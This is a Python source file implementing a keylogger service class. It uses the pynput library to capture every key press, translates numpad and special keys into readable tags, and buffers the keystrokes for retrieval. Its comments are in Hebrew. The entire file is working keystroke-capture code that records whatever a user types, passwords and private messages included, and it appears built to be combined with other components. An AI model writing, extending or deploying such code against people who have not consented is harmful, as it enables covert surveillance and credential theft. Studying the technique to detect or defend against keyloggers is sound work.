import threading
from pynput import keyboard
from interfaces.ikeyLogger import Ikeylogger

class Keyloggerservice(Ikeylogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = None
        self.lock = threading.Lock()
    
    NUMPAD_VK_MAP = {
    96: '0',  # NumPad 0
    97: '1',  # NumPad 1
    98: '2',  # NumPad 2
    99: '3',  # NumPad 3
    100: '4', # NumPad 4
    101: '5', # NumPad 5
    102: '6', # NumPad 6
    103: '7', # NumPad 7
    104: '8', # NumPad 8
    105: '9', # NumPad 9
    110: '.'  # NumPad .
}

# במקרה של מקש מיוחד כגון המקשים בצד ימין של המקלדת שמוצגים אחרת אז צריך לקחת מהמילון
    def special_tag(self, key):
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif hasattr(key, 'vk') and key.vk in self.NUMPAD_VK_MAP:
            return self.NUMPAD_VK_MAP[key.vk]
        elif key == keyboard.Key.space:
            return ' '
        elif key == keyboard.Key.enter:
            return '\n'
        elif key == keyboard.Key.tab:
            return '[TAB]'
        elif key == keyboard.Key.backspace:
            return '[BACKSPACE]'
        elif key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
            return '[SHIFT]'
        elif key in (keyboard.Key.ctrl_r, keyboard.Key.ctrl_l):
            return '[CTRL]'
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            return '[ALT]'
        elif key == keyboard.Key.caps_lock:
            return '[CAPSLOCK]'
        elif str(key).startswith('Key.f'):  # פונקציות F1-F12
            return f'[{key}]'
        else:
            return f'[{key}]'

    def _on_press(self, key):
        try:
            with self.lock:
                self.logged_keys.append(self.special_tag(key))
        except Exception:
            pass

    def start_logging(self):
        with self.lock:
            self.logged_keys = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None


    def get_logged_keys(self):
        with self.lock:
            keys_copy = self.logged_keys.copy()
            self.logged_keys.clear()
        return keys_copy
